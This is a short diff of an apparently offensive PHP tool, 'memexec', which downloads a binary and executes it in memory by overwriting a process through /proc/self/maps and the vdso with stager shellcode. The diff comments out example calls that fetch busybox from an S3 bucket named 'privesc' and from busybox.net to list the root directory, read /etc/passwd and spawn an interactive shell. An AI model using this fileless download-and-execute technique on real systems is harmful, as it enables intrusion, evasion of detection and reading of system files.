@@ -1,5 +1,3 @@
-<?php
-
 // Code to execute by a php child process to ovewrite it's process with the stager shellcode
 $executor='
 preg_match("/^.*vdso.*\$/m", file_get_contents("/proc/self/maps"), $matches);
@@ -74,7 +72,7 @@ function memexec($url, $argv = [], $stop = true)
     if($stop) posix_kill(posix_getpid(), 19);
 }
 
-memexec("https://privesc.s3.eu-west-1.amazonaws.com/memexec/busybox", ["ls", "-la", "/"], false); //PIE
-memexec("https://busybox.net/downloads/binaries/1.21.1/busybox-x86_64", ["ls", "-la", "/"], false); // No PIE
-memexec("https://busybox.net/downloads/binaries/1.21.1/busybox-x86_64", ["cat", "/etc/passwd"], false);
-memexec("https://busybox.net/downloads/binaries/1.21.1/busybox-x86_64", ["sh","-i"], true);
+// memexec("https://privesc.s3.eu-west-1.amazonaws.com/memexec/busybox", ["ls", "-la", "/"], false); //PIE
+// memexec("https://busybox.net/downloads/binaries/1.21.1/busybox-x86_64", ["ls", "-la", "/"], false); // No PIE
+// memexec("https://busybox.net/downloads/binaries/1.21.1/busybox-x86_64", ["cat", "/etc/passwd"], false);
+// memexec("https://busybox.net/downloads/binaries/1.21.1/busybox-x86_64", ["sh","-i"], true);
